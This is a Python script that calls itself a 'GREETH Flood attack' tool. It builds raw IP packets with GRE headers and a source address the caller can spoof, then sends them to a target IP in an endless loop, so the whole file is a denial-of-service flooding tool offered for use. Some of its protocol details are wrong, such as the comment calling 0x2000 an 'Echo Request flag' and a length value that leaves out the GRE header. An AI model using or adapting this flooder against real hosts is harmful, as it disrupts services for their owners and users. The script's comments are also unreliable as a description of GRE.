import socket
import struct
import time
import argparse

def run_gre_flood(target_ip, source_ip):
    payload = b"GREETH Flood Test"

    # Create a raw socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

    print(f"Starting GREETH Flood from {source_ip} to {target_ip}...")
    while True:
        # Build IP header
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            0x45,                # Version and IHL
            0,                   # TOS
            20 + len(payload),   # Total length
            54321,               # ID
            0,                   # Fragment offset
            64,                  # TTL
            socket.IPPROTO_GRE,  # Protocol (47 for GRE)
            0,                   # Checksum (calculated automatically by OS)
            socket.inet_aton(source_ip),  # Source IP
            socket.inet_aton(target_ip),  # Destination IP
        )

        # Build GRE header with Echo Request flag
        gre_header = struct.pack("!HH", 0x2000, len(payload))  # Echo Request flag

        # Combine headers and payload
        packet = ip_header + gre_header + payload

        # Send the packet
        sock.sendto(packet, (target_ip, 0))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Run a GREETH Flood attack.")
    parser.add_argument("target_ip", help="The IP address of the target")
    parser.add_argument("source_ip", help="The IP address of the source")
    args = parser.parse_args()
    
    run_gre_flood(args.target_ip, args.source_ip)

